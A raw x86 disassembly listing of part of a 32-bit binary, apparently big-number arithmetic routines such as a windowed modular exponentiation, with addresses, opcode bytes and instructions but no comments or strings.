  404e96:	83 3b 00             	cmpl   $0x0,(%ebx)
  404e99:	7d 08                	jge    0x404ea3
  404e9b:	85 ff                	test   %edi,%edi
  404e9d:	74 04                	je     0x404ea3
  404e9f:	2b f7                	sub    %edi,%esi
  404ea1:	8b fe                	mov    %esi,%edi
  404ea3:	8b 44 24 14          	mov    0x14(%esp),%eax
  404ea7:	89 38                	mov    %edi,(%eax)
  404ea9:	5f                   	pop    %edi
  404eaa:	5d                   	pop    %ebp
  404eab:	5b                   	pop    %ebx
  404eac:	33 c0                	xor    %eax,%eax
  404eae:	5e                   	pop    %esi
  404eaf:	c2 0c 00             	ret    $0xc
  404eb2:	81 ec 40 06 00 00    	sub    $0x640,%esp
  404eb8:	53                   	push   %ebx
  404eb9:	8b 9c 24 54 06 00 00 	mov    0x654(%esp),%ebx
  404ec0:	55                   	push   %ebp
  404ec1:	56                   	push   %esi
  404ec2:	33 f6                	xor    %esi,%esi
  404ec4:	56                   	push   %esi
  404ec5:	53                   	push   %ebx
  404ec6:	e8 18 f6 ff ff       	call   0x4044e3
  404ecb:	85 c0                	test   %eax,%eax
  404ecd:	0f 88 7b 05 00 00    	js     0x40544e
  404ed3:	8b 43 08             	mov    0x8(%ebx),%eax
  404ed6:	f6 00 01             	testb  $0x1,(%eax)
  404ed9:	0f 84 6f 05 00 00    	je     0x40544e
  404edf:	8b ac 24 58 06 00 00 	mov    0x658(%esp),%ebp
  404ee6:	56                   	push   %esi
  404ee7:	55                   	push   %ebp
  404ee8:	e8 f6 f5 ff ff       	call   0x4044e3
  404eed:	85 c0                	test   %eax,%eax
  404eef:	0f 88 59 05 00 00    	js     0x40544e
  404ef5:	57                   	push   %edi
  404ef6:	53                   	push   %ebx
  404ef7:	8d 44 24 18          	lea    0x18(%esp),%eax
  404efb:	50                   	push   %eax
  404efc:	e8 52 10 00 00       	call   0x405f53
  404f01:	8d 44 24 34          	lea    0x34(%esp),%eax
  404f05:	50                   	push   %eax
  404f06:	e8 9c ea ff ff       	call   0x4039a7
  404f0b:	8d 44 24 28          	lea    0x28(%esp),%eax
  404f0f:	50                   	push   %eax
  404f10:	e8 92 ea ff ff       	call   0x4039a7
  404f15:	8d 44 24 44          	lea    0x44(%esp),%eax
  404f19:	50                   	push   %eax
  404f1a:	e8 88 ea ff ff       	call   0x4039a7
  404f1f:	68 00 06 00 00       	push   $0x600
  404f24:	8d 44 24 54          	lea    0x54(%esp),%eax
  404f28:	56                   	push   %esi
  404f29:	50                   	push   %eax
  404f2a:	e8 18 d7 ff ff       	call   0x402647
  404f2f:	83 c4 0c             	add    $0xc,%esp
  404f32:	55                   	push   %ebp
  404f33:	e8 ee ee ff ff       	call   0x403e26
  404f38:	3d 9f 02 00 00       	cmp    $0x29f,%eax
  404f3d:	77 24                	ja     0x404f63
  404f3f:	3d ef 00 00 00       	cmp    $0xef,%eax
  404f44:	76 04                	jbe    0x404f4a
  404f46:	6a 05                	push   $0x5
  404f48:	eb 1b                	jmp    0x404f65
  404f4a:	83 f8 4f             	cmp    $0x4f,%eax
  404f4d:	76 04                	jbe    0x404f53
  404f4f:	6a 04                	push   $0x4
  404f51:	eb 12                	jmp    0x404f65
  404f53:	6a 17                	push   $0x17
  404f55:	59                   	pop    %ecx
  404f56:	3b c8                	cmp    %eax,%ecx
  404f58:	1b ff                	sbb    %edi,%edi
  404f5a:	83 e7 02             	and    $0x2,%edi
  404f5d:	47                   	inc    %edi
  404f5e:	83 ff 06             	cmp    $0x6,%edi
  404f61:	76 03                	jbe    0x404f66
  404f63:	6a 06                	push   $0x6
  404f65:	5f                   	pop    %edi
  404f66:	8b 43 04             	mov    0x4(%ebx),%eax
  404f69:	40                   	inc    %eax
  404f6a:	50                   	push   %eax
  404f6b:	ff b4 24 58 06 00 00 	push   0x658(%esp)
  404f72:	89 44 24 18          	mov    %eax,0x18(%esp)
  404f76:	e8 7a ea ff ff       	call   0x4039f5
  404f7b:	33 ed                	xor    %ebp,%ebp
  404f7d:	8b f0                	mov    %eax,%esi
  404f7f:	45                   	inc    %ebp
  404f80:	85 f6                	test   %esi,%esi
  404f82:	0f 85 62 04 00 00    	jne    0x4053ea
  404f88:	ff 74 24 10          	push   0x10(%esp)
  404f8c:	8d 44 24 60          	lea    0x60(%esp),%eax
  404f90:	50                   	push   %eax
  404f91:	e8 5f ea ff ff       	call   0x4039f5
  404f96:	8b f0                	mov    %eax,%esi
  404f98:	85 f6                	test   %esi,%esi
  404f9a:	0f 85 4a 04 00 00    	jne    0x4053ea
  404fa0:	8b 44 24 10          	mov    0x10(%esp),%eax
  404fa4:	03 c0                	add    %eax,%eax
  404fa6:	50                   	push   %eax
  404fa7:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  404fab:	50                   	push   %eax
  404fac:	e8 44 ea ff ff       	call   0x4039f5
  404fb1:	8b f0                	mov    %eax,%esi
  404fb3:	85 f6                	test   %esi,%esi
  404fb5:	0f 85 2f 04 00 00    	jne    0x4053ea
  404fbb:	8b 84 24 58 06 00 00 	mov    0x658(%esp),%eax
  404fc2:	33 c9                	xor    %ecx,%ecx
  404fc4:	83 38 ff             	cmpl   $0xffffffff,(%eax)
  404fc7:	0f 94 c1             	sete   %cl
  404fca:	89 4c 24 40          	mov    %ecx,0x40(%esp)
  404fce:	85 c9                	test   %ecx,%ecx
  404fd0:	74 24                	je     0x404ff6
  404fd2:	50                   	push   %eax
  404fd3:	8d 44 24 48          	lea    0x48(%esp),%eax
  404fd7:	50                   	push   %eax
  404fd8:	e8 0d eb ff ff       	call   0x403aea
  404fdd:	8b f0                	mov    %eax,%esi
  404fdf:	85 f6                	test   %esi,%esi
  404fe1:	0f 85 03 04 00 00    	jne    0x4053ea
  404fe7:	8d 44 24 44          	lea    0x44(%esp),%eax
  404feb:	89 6c 24 44          	mov    %ebp,0x44(%esp)
  404fef:	89 84 24 58 06 00 00 	mov    %eax,0x658(%esp)
  404ff6:	8b 84 24 64 06 00 00 	mov    0x664(%esp),%eax
  404ffd:	85 c0                	test   %eax,%eax
  404fff:	74 0f                	je     0x405010
  405001:	83 78 08 00          	cmpl   $0x0,0x8(%eax)
  405005:	74 09                	je     0x405010
  405007:	6a 0c                	push   $0xc
  405009:	50                   	push   %eax
  40500a:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  40500e:	eb 58                	jmp    0x405068
  405010:	55                   	push   %ebp
  405011:	8d 44 24 38          	lea    0x38(%esp),%eax
  405015:	50                   	push   %eax
  405016:	e8 d8 ec ff ff       	call   0x403cf3
  40501b:	8b f0                	mov    %eax,%esi
  40501d:	85 f6                	test   %esi,%esi
  40501f:	0f 85 c5 03 00 00    	jne    0x4053ea
  405025:	8b 43 04             	mov    0x4(%ebx),%eax
  405028:	c1 e0 06             	shl    $0x6,%eax
  40502b:	50                   	push   %eax
  40502c:	8d 44 24 38          	lea    0x38(%esp),%eax
  405030:	50                   	push   %eax
  405031:	e8 24 f2 ff ff       	call   0x40425a
  405036:	8b f0                	mov    %eax,%esi
  405038:	85 f6                	test   %esi,%esi
  40503a:	0f 85 aa 03 00 00    	jne    0x4053ea
  405040:	53                   	push   %ebx
  405041:	8d 44 24 38          	lea    0x38(%esp),%eax
  405045:	50                   	push   %eax
  405046:	50                   	push   %eax
  405047:	e8 56 fd ff ff       	call   0x404da2
  40504c:	8b f0                	mov    %eax,%esi
  40504e:	85 f6                	test   %esi,%esi
  405050:	0f 85 94 03 00 00    	jne    0x4053ea
  405056:	8b 84 24 64 06 00 00 	mov    0x664(%esp),%eax
  40505d:	85 c0                	test   %eax,%eax
  40505f:	74 10                	je     0x405071
  405061:	6a 0c                	push   $0xc
  405063:	8d 4c 24 38          	lea    0x38(%esp),%ecx
  405067:	51                   	push   %ecx
  405068:	50                   	push   %eax
  405069:	e8 b7 d5 ff ff       	call   0x402625
  40506e:	83 c4 0c             	add    $0xc,%esp
  405071:	8b b4 24 58 06 00 00 	mov    0x658(%esp),%esi
  405078:	53                   	push   %ebx
  405079:	56                   	push   %esi
  40507a:	e8 cc f3 ff ff       	call   0x40444b
  40507f:	85 c0                	test   %eax,%eax
  405081:	8d 44 24 5c          	lea    0x5c(%esp),%eax
  405085:	78 0a                	js     0x405091
  405087:	53                   	push   %ebx
  405088:	56                   	push   %esi
  405089:	50                   	push   %eax
  40508a:	e8 13 fd ff ff       	call   0x404da2
  40508f:	eb 07                	jmp    0x405098
  405091:	56                   	push   %esi
  405092:	50                   	push   %eax
  405093:	e8 52 ea ff ff       	call   0x403aea
  405098:	8b f0                	mov    %eax,%esi
  40509a:	85 f6                	test   %esi,%esi
  40509c:	0f 85 48 03 00 00    	jne    0x4053ea
  4050a2:	8d 44 24 28          	lea    0x28(%esp),%eax
  4050a6:	50                   	push   %eax
  4050a7:	ff 74 24 18          	push   0x18(%esp)
  4050ab:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  4050af:	53                   	push   %ebx
  4050b0:	50                   	push   %eax
  4050b1:	8d 44 24 6c          	lea    0x6c(%esp),%eax
  4050b5:	50                   	push   %eax
  4050b6:	e8 d4 0e 00 00       	call   0x405f8f
  4050bb:	8b f0                	mov    %eax,%esi
  4050bd:	85 f6                	test   %esi,%esi
  4050bf:	0f 85 25 03 00 00    	jne    0x4053ea
  4050c5:	8d 44 24 34          	lea    0x34(%esp),%eax
  4050c9:	50                   	push   %eax
  4050ca:	ff b4 24 58 06 00 00 	push   0x658(%esp)
  4050d1:	e8 14 ea ff ff       	call   0x403aea
  4050d6:	8b f0                	mov    %eax,%esi
  4050d8:	85 f6                	test   %esi,%esi
  4050da:	0f 85 0a 03 00 00    	jne    0x4053ea
  4050e0:	8d 44 24 28          	lea    0x28(%esp),%eax
  4050e4:	50                   	push   %eax
  4050e5:	ff 74 24 18          	push   0x18(%esp)
  4050e9:	53                   	push   %ebx
  4050ea:	ff b4 24 60 06 00 00 	push   0x660(%esp)
  4050f1:	e8 a3 0f 00 00       	call   0x406099
  4050f6:	8b f0                	mov    %eax,%esi
  4050f8:	85 f6                	test   %esi,%esi
  4050fa:	0f 85 ea 02 00 00    	jne    0x4053ea
  405100:	3b fd                	cmp    %ebp,%edi
  405102:	0f 86 0c 01 00 00    	jbe    0x405214
  405108:	8d 4f ff             	lea    -0x1(%edi),%ecx
  40510b:	8b d5                	mov    %ebp,%edx
  40510d:	d3 e2                	shl    %cl,%edx
  40510f:	8d 4c 24 50          	lea    0x50(%esp),%ecx
  405113:	6b c2 0c             	imul   $0xc,%edx,%eax
  405116:	89 54 24 24          	mov    %edx,0x24(%esp)
  40511a:	03 c8                	add    %eax,%ecx
  40511c:	8b 43 04             	mov    0x4(%ebx),%eax
  40511f:	40                   	inc    %eax
  405120:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  405124:	50                   	push   %eax
  405125:	51                   	push   %ecx
  405126:	e8 ca e8 ff ff       	call   0x4039f5
  40512b:	8b f0                	mov    %eax,%esi
  40512d:	85 f6                	test   %esi,%esi
  40512f:	0f 85 b5 02 00 00    	jne    0x4053ea
  405135:	8d 44 24 5c          	lea    0x5c(%esp),%eax
  405139:	50                   	push   %eax
  40513a:	ff 74 24 14          	push   0x14(%esp)
  40513e:	e8 a7 e9 ff ff       	call   0x403aea
  405143:	8b f0                	mov    %eax,%esi
  405145:	85 f6                	test   %esi,%esi
  405147:	0f 85 9d 02 00 00    	jne    0x4053ea
  40514d:	21 44 24 1c          	and    %eax,0x1c(%esp)
  405151:	8d 47 ff             	lea    -0x1(%edi),%eax
  405154:	85 c0                	test   %eax,%eax
  405156:	74 2f                	je     0x405187
  405158:	8d 44 24 28          	lea    0x28(%esp),%eax
  40515c:	50                   	push   %eax
  40515d:	ff 74 24 18          	push   0x18(%esp)
  405161:	8b 44 24 18          	mov    0x18(%esp),%eax
  405165:	53                   	push   %ebx
  405166:	50                   	push   %eax
  405167:	50                   	push   %eax
  405168:	e8 22 0e 00 00       	call   0x405f8f
  40516d:	8b f0                	mov    %eax,%esi
  40516f:	85 f6                	test   %esi,%esi
  405171:	0f 85 73 02 00 00    	jne    0x4053ea
  405177:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  40517b:	8d 4f ff             	lea    -0x1(%edi),%ecx
  40517e:	40                   	inc    %eax
  40517f:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  405183:	3b c1                	cmp    %ecx,%eax
  405185:	72 d1                	jb     0x405158
  405187:	8b 44 24 24          	mov    0x24(%esp),%eax
  40518b:	8b d5                	mov    %ebp,%edx
  40518d:	8b cf                	mov    %edi,%ecx
  40518f:	40                   	inc    %eax
  405190:	d3 e2                	shl    %cl,%edx
  405192:	89 44 24 10          	mov    %eax,0x10(%esp)
  405196:	89 54 24 1c          	mov    %edx,0x1c(%esp)
  40519a:	3b c2                	cmp    %edx,%eax
  40519c:	73 76                	jae    0x405214
  40519e:	6b c0 0c             	imul   $0xc,%eax,%eax
  4051a1:	8d 4c 24 50          	lea    0x50(%esp),%ecx
  4051a5:	03 c8                	add    %eax,%ecx
  4051a7:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  4051ab:	8b 43 04             	mov    0x4(%ebx),%eax
  4051ae:	40                   	inc    %eax
  4051af:	50                   	push   %eax
  4051b0:	51                   	push   %ecx
  4051b1:	e8 3f e8 ff ff       	call   0x4039f5
  4051b6:	8b f0                	mov    %eax,%esi
  4051b8:	85 f6                	test   %esi,%esi
  4051ba:	0f 85 2a 02 00 00    	jne    0x4053ea
  4051c0:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  4051c4:	8d 41 f4             	lea    -0xc(%ecx),%eax
  4051c7:	50                   	push   %eax
  4051c8:	51                   	push   %ecx
  4051c9:	e8 1c e9 ff ff       	call   0x403aea
  4051ce:	8b f0                	mov    %eax,%esi
  4051d0:	85 f6                	test   %esi,%esi
  4051d2:	0f 85 12 02 00 00    	jne    0x4053ea
  4051d8:	8d 44 24 28          	lea    0x28(%esp),%eax
  4051dc:	50                   	push   %eax
  4051dd:	ff 74 24 18          	push   0x18(%esp)
  4051e1:	8d 44 24 64          	lea    0x64(%esp),%eax
  4051e5:	53                   	push   %ebx
  4051e6:	50                   	push   %eax
  4051e7:	ff 74 24 28          	push   0x28(%esp)
  4051eb:	e8 9f 0d 00 00       	call   0x405f8f
  4051f0:	8b f0                	mov    %eax,%esi
  4051f2:	85 f6                	test   %esi,%esi
  4051f4:	0f 85 f0 01 00 00    	jne    0x4053ea
  4051fa:	8b 44 24 10          	mov    0x10(%esp),%eax
  4051fe:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  405202:	40                   	inc    %eax
  405203:	83 c1 0c             	add    $0xc,%ecx
  405206:	89 44 24 10          	mov    %eax,0x10(%esp)
  40520a:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  40520e:	3b 44 24 1c          	cmp    0x1c(%esp),%eax
  405212:	72 97                	jb     0x4051ab
  405214:	8b 84 24 5c 06 00 00 	mov    0x65c(%esp),%eax
  40521b:	33 d2                	xor    %edx,%edx
  40521d:	33 f6                	xor    %esi,%esi
  40521f:	89 54 24 24          	mov    %edx,0x24(%esp)
  405223:	89 74 24 20          	mov    %esi,0x20(%esp)
  405227:	8b 40 04             	mov    0x4(%eax),%eax
  40522a:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  40522e:	33 c0                	xor    %eax,%eax
  405230:	33 c9                	xor    %ecx,%ecx
  405232:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  405236:	eb 04                	jmp    0x40523c
  405238:	8b 44 24 18          	mov    0x18(%esp),%eax
  40523c:	85 c0                	test   %eax,%eax
  40523e:	75 14                	jne    0x405254
  405240:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  405244:	85 c0                	test   %eax,%eax
  405246:	0f 84 fd 00 00 00    	je     0x405349
  40524c:	48                   	dec    %eax
  40524d:	6a 20                	push   $0x20
  40524f:	89 44 24 20          	mov    %eax,0x20(%esp)
  405253:	58                   	pop    %eax
  405254:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  405258:	48                   	dec    %eax
  405259:	89 44 24 18          	mov    %eax,0x18(%esp)
  40525d:	8b 84 24 5c 06 00 00 	mov    0x65c(%esp),%eax
  405264:	8b 40 08             	mov    0x8(%eax),%eax
  405267:	8b 04 88             	mov    (%eax,%ecx,4),%eax
  40526a:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  40526e:	d3 e8                	shr    %cl,%eax
  405270:	23 c5                	and    %ebp,%eax
  405272:	75 38                	jne    0x4052ac
  405274:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  405278:	85 c9                	test   %ecx,%ecx
  40527a:	74 bc                	je     0x405238
  40527c:	3b cd                	cmp    %ebp,%ecx
  40527e:	75 2c                	jne    0x4052ac
  405280:	8d 44 24 28          	lea    0x28(%esp),%eax
  405284:	50                   	push   %eax
  405285:	ff 74 24 18          	push   0x18(%esp)
  405289:	8b 84 24 5c 06 00 00 	mov    0x65c(%esp),%eax
  405290:	53                   	push   %ebx
  405291:	50                   	push   %eax
  405292:	50                   	push   %eax
  405293:	e8 f7 0c 00 00       	call   0x405f8f
  405298:	8b f0                	mov    %eax,%esi
  40529a:	85 f6                	test   %esi,%esi
  40529c:	0f 85 48 01 00 00    	jne    0x4053ea
  4052a2:	8b 54 24 24          	mov    0x24(%esp),%edx
  4052a6:	8b 74 24 20          	mov    0x20(%esp),%esi
  4052aa:	eb 8c                	jmp    0x405238
  4052ac:	6a 02                	push   $0x2
  4052ae:	59                   	pop    %ecx
  4052af:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  4052b3:	42                   	inc    %edx
  4052b4:	8b cf                	mov    %edi,%ecx
  4052b6:	89 54 24 24          	mov    %edx,0x24(%esp)
  4052ba:	2b ca                	sub    %edx,%ecx
  4052bc:	d3 e0                	shl    %cl,%eax
  4052be:	0b f0                	or     %eax,%esi
  4052c0:	8b 44 24 18          	mov    0x18(%esp),%eax
  4052c4:	89 74 24 20          	mov    %esi,0x20(%esp)
  4052c8:	3b d7                	cmp    %edi,%edx
  4052ca:	0f 85 6c ff ff ff    	jne    0x40523c
  4052d0:	83 64 24 10 00       	andl   $0x0,0x10(%esp)
  4052d5:	85 ff                	test   %edi,%edi
  4052d7:	74 33                	je     0x40530c
  4052d9:	8d 44 24 28          	lea    0x28(%esp),%eax
  4052dd:	50                   	push   %eax
  4052de:	ff 74 24 18          	push   0x18(%esp)
  4052e2:	8b 84 24 5c 06 00 00 	mov    0x65c(%esp),%eax
  4052e9:	53                   	push   %ebx
  4052ea:	50                   	push   %eax
  4052eb:	50                   	push   %eax
  4052ec:	e8 9e 0c 00 00       	call   0x405f8f
  4052f1:	8b f0                	mov    %eax,%esi
  4052f3:	85 f6                	test   %esi,%esi
  4052f5:	0f 85 ef 00 00 00    	jne    0x4053ea
  4052fb:	8b 44 24 10          	mov    0x10(%esp),%eax
  4052ff:	40                   	inc    %eax
  405300:	89 44 24 10          	mov    %eax,0x10(%esp)
  405304:	3b c7                	cmp    %edi,%eax
  405306:	72 d1                	jb     0x4052d9
  405308:	8b 74 24 20          	mov    0x20(%esp),%esi
  40530c:	8d 44 24 28          	lea    0x28(%esp),%eax
  405310:	50                   	push   %eax
  405311:	ff 74 24 18          	push   0x18(%esp)
  405315:	6b c6 0c             	imul   $0xc,%esi,%eax
  405318:	8d 74 24 58          	lea    0x58(%esp),%esi
  40531c:	53                   	push   %ebx
  40531d:	03 c6                	add    %esi,%eax
  40531f:	50                   	push   %eax
  405320:	ff b4 24 64 06 00 00 	push   0x664(%esp)
  405327:	e8 63 0c 00 00       	call   0x405f8f
  40532c:	8b f0                	mov    %eax,%esi
  40532e:	85 f6                	test   %esi,%esi
  405330:	0f 85 b4 00 00 00    	jne    0x4053ea
  405336:	33 d2                	xor    %edx,%edx
  405338:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  40533c:	89 54 24 24          	mov    %edx,0x24(%esp)
  405340:	89 74 24 20          	mov    %esi,0x20(%esp)
  405344:	e9 ef fe ff ff       	jmp    0x405238
  405349:	83 64 24 10 00       	andl   $0x0,0x10(%esp)
  40534e:	85 d2                	test   %edx,%edx
  405350:	74 62                	je     0x4053b4
  405352:	8d 44 24 28          	lea    0x28(%esp),%eax
  405356:	50                   	push   %eax
  405357:	ff 74 24 18          	push   0x18(%esp)
  40535b:	8b 84 24 5c 06 00 00 	mov    0x65c(%esp),%eax
  405362:	53                   	push   %ebx
  405363:	50                   	push   %eax
  405364:	50                   	push   %eax
  405365:	e8 25 0c 00 00       	call   0x405f8f
  40536a:	8b f0                	mov    %eax,%esi
  40536c:	85 f6                	test   %esi,%esi
  40536e:	75 7a                	jne    0x4053ea
  405370:	8b 54 24 20          	mov    0x20(%esp),%edx
  405374:	8b c5                	mov    %ebp,%eax
  405376:	8b cf                	mov    %edi,%ecx
  405378:	03 d2                	add    %edx,%edx
  40537a:	d3 e0                	shl    %cl,%eax
  40537c:	89 54 24 20          	mov    %edx,0x20(%esp)
  405380:	85 c2                	test   %eax,%edx
  405382:	74 21                	je     0x4053a5
  405384:	8d 44 24 28          	lea    0x28(%esp),%eax
  405388:	50                   	push   %eax
  405389:	ff 74 24 18          	push   0x18(%esp)
  40538d:	8d 44 24 64          	lea    0x64(%esp),%eax
  405391:	53                   	push   %ebx
  405392:	50                   	push   %eax
  405393:	ff b4 24 64 06 00 00 	push   0x664(%esp)
  40539a:	e8 f0 0b 00 00       	call   0x405f8f
  40539f:	8b f0                	mov    %eax,%esi
  4053a1:	85 f6                	test   %esi,%esi
  4053a3:	75 45                	jne    0x4053ea
  4053a5:	8b 44 24 10          	mov    0x10(%esp),%eax
  4053a9:	40                   	inc    %eax
  4053aa:	89 44 24 10          	mov    %eax,0x10(%esp)
  4053ae:	3b 44 24 24          	cmp    0x24(%esp),%eax
  4053b2:	72 9e                	jb     0x405352
  4053b4:	8d 44 24 28          	lea    0x28(%esp),%eax
  4053b8:	50                   	push   %eax
  4053b9:	ff 74 24 18          	push   0x18(%esp)
  4053bd:	53                   	push   %ebx
  4053be:	ff b4 24 60 06 00 00 	push   0x660(%esp)
  4053c5:	e8 cf 0c 00 00       	call   0x406099
  4053ca:	8b f0                	mov    %eax,%esi
  4053cc:	85 f6                	test   %esi,%esi
  4053ce:	75 1a                	jne    0x4053ea
  4053d0:	39 44 24 40          	cmp    %eax,0x40(%esp)
  4053d4:	74 14                	je     0x4053ea
  4053d6:	8b 84 24 54 06 00 00 	mov    0x654(%esp),%eax
  4053dd:	50                   	push   %eax
  4053de:	53                   	push   %ebx
  4053df:	50                   	push   %eax
  4053e0:	83 08 ff             	orl    $0xffffffff,(%eax)
  4053e3:	e8 9d f2 ff ff       	call   0x404685
  4053e8:	8b f0                	mov    %eax,%esi
  4053ea:	8b dd                	mov    %ebp,%ebx
  4053ec:	8b cf                	mov    %edi,%ecx
  4053ee:	d3 e3                	shl    %cl,%ebx
  4053f0:	8d 4f ff             	lea    -0x1(%edi),%ecx
  4053f3:	d3 e5                	shl    %cl,%ebp
  4053f5:	3b eb                	cmp    %ebx,%ebp
  4053f7:	73 17                	jae    0x405410
  4053f9:	6b c5 0c             	imul   $0xc,%ebp,%eax
  4053fc:	8d 7c 24 50          	lea    0x50(%esp),%edi
  405400:	03 f8                	add    %eax,%edi
  405402:	2b dd                	sub    %ebp,%ebx
  405404:	57                   	push   %edi
  405405:	e8 b6 e5 ff ff       	call   0x4039c0
  40540a:	83 c7 0c             	add    $0xc,%edi
  40540d:	4b                   	dec    %ebx
  40540e:	75 f4                	jne    0x405404
  405410:	8d 44 24 5c          	lea    0x5c(%esp),%eax
  405414:	50                   	push   %eax
  405415:	e8 a6 e5 ff ff       	call   0x4039c0
  40541a:	8d 44 24 28          	lea    0x28(%esp),%eax
  40541e:	50                   	push   %eax
  40541f:	e8 9c e5 ff ff       	call   0x4039c0
  405424:	8d 44 24 44          	lea    0x44(%esp),%eax
  405428:	50                   	push   %eax
  405429:	e8 92 e5 ff ff       	call   0x4039c0
  40542e:	8b 84 24 64 06 00 00 	mov    0x664(%esp),%eax
  405435:	5f                   	pop    %edi
  405436:	85 c0                	test   %eax,%eax
  405438:	74 06                	je     0x405440
  40543a:	83 78 08 00          	cmpl   $0x0,0x8(%eax)
  40543e:	75 0a                	jne    0x40544a
  405440:	8d 44 24 30          	lea    0x30(%esp),%eax
  405444:	50                   	push   %eax
  405445:	e8 76 e5 ff ff       	call   0x4039c0
  40544a:	8b c6                	mov    %esi,%eax
  40544c:	eb 03                	jmp    0x405451
  40544e:	6a fc                	push   $0xfffffffc
  405450:	58                   	pop    %eax
  405451:	5e                   	pop    %esi
  405452:	5d                   	pop    %ebp
  405453:	5b                   	pop    %ebx
  405454:	81 c4 40 06 00 00    	add    $0x640,%esp
  40545a:	c2 14 00             	ret    $0x14
  40545d:	55                   	push   %ebp
  40545e:	8b ec                	mov    %esp,%ebp
  405460:	81 ec 00 04 00 00    	sub    $0x400,%esp
  405466:	81 7d 0c 00 04 00 00 	cmpl   $0x400,0xc(%ebp)
  40546d:	76 05                	jbe    0x405474
  40546f:	6a fc                	push   $0xfffffffc
  405471:	58                   	pop    %eax
  405472:	eb 26                	jmp    0x40549a
  405474:	ff 75 0c             	push   0xc(%ebp)
  405477:	8d 85 00 fc ff ff    	lea    -0x400(%ebp),%eax
  40547d:	50                   	push   %eax
  40547e:	ff 75 14             	push   0x14(%ebp)
  405481:	ff 55 10             	call   *0x10(%ebp)
  405484:	85 c0                	test   %eax,%eax
  405486:	75 12                	jne    0x40549a
  405488:	ff 75 0c             	push   0xc(%ebp)
  40548b:	8d 85 00 fc ff ff    	lea    -0x400(%ebp),%eax
  405491:	50                   	push   %eax
  405492:	ff 75 08             	push   0x8(%ebp)
  405495:	e8 df ec ff ff       	call   0x404179
  40549a:	8b e5                	mov    %ebp,%esp
  40549c:	5d                   	pop    %ebp
  40549d:	c2 10 00             	ret    $0x10
  4054a0:	55                   	push   %ebp
  4054a1:	8b ec                	mov    %esp,%ebp
  4054a3:	83 ec 24             	sub    $0x24,%esp
  4054a6:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4054a9:	56                   	push   %esi
  4054aa:	50                   	push   %eax
  4054ab:	e8 f7 e4 ff ff       	call   0x4039a7
  4054b0:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4054b3:	50                   	push   %eax
  4054b4:	e8 ee e4 ff ff       	call   0x4039a7
  4054b9:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4054bc:	50                   	push   %eax
  4054bd:	e8 e5 e4 ff ff       	call   0x4039a7
  4054c2:	ff 75 0c             	push   0xc(%ebp)
  4054c5:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4054c8:	50                   	push   %eax
  4054c9:	e8 1c e6 ff ff       	call   0x403aea
  4054ce:	8b f0                	mov    %eax,%esi
  4054d0:	85 f6                	test   %esi,%esi
  4054d2:	0f 85 1f 01 00 00    	jne    0x4055f7
  4054d8:	ff 75 10             	push   0x10(%ebp)
  4054db:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4054de:	50                   	push   %eax
  4054df:	e8 06 e6 ff ff       	call   0x403aea
  4054e4:	8b f0                	mov    %eax,%esi
  4054e6:	85 f6                	test   %esi,%esi
  4054e8:	0f 85 09 01 00 00    	jne    0x4055f7
  4054ee:	57                   	push   %edi
  4054ef:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4054f2:	50                   	push   %eax
  4054f3:	e8 f4 e8 ff ff       	call   0x403dec
  4054f8:	8b f8                	mov    %eax,%edi
  4054fa:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4054fd:	50                   	push   %eax
  4054fe:	e8 e9 e8 ff ff       	call   0x403dec
  405503:	3b c7                	cmp    %edi,%eax
  405505:	73 02                	jae    0x405509
  405507:	8b f8                	mov    %eax,%edi
  405509:	57                   	push   %edi
  40550a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40550d:	50                   	push   %eax
  40550e:	e8 11 ee ff ff       	call   0x404324
  405513:	8b f0                	mov    %eax,%esi
  405515:	85 f6                	test   %esi,%esi
  405517:	0f 85 d9 00 00 00    	jne    0x4055f6
  40551d:	57                   	push   %edi
  40551e:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405521:	50                   	push   %eax
  405522:	e8 fd ed ff ff       	call   0x404324
  405527:	8b f0                	mov    %eax,%esi
  405529:	85 f6                	test   %esi,%esi
  40552b:	0f 85 c5 00 00 00    	jne    0x4055f6
  405531:	53                   	push   %ebx
  405532:	33 db                	xor    %ebx,%ebx
  405534:	43                   	inc    %ebx
  405535:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  405538:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  40553b:	e9 84 00 00 00       	jmp    0x4055c4
  405540:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405543:	50                   	push   %eax
  405544:	e8 a3 e8 ff ff       	call   0x403dec
  405549:	50                   	push   %eax
  40554a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40554d:	50                   	push   %eax
  40554e:	e8 d1 ed ff ff       	call   0x404324
  405553:	8b f0                	mov    %eax,%esi
  405555:	85 f6                	test   %esi,%esi
  405557:	0f 85 98 00 00 00    	jne    0x4055f5
  40555d:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405560:	50                   	push   %eax
  405561:	e8 86 e8 ff ff       	call   0x403dec
  405566:	50                   	push   %eax
  405567:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40556a:	50                   	push   %eax
  40556b:	e8 b4 ed ff ff       	call   0x404324
  405570:	8b f0                	mov    %eax,%esi
  405572:	85 f6                	test   %esi,%esi
  405574:	75 7f                	jne    0x4055f5
  405576:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405579:	50                   	push   %eax
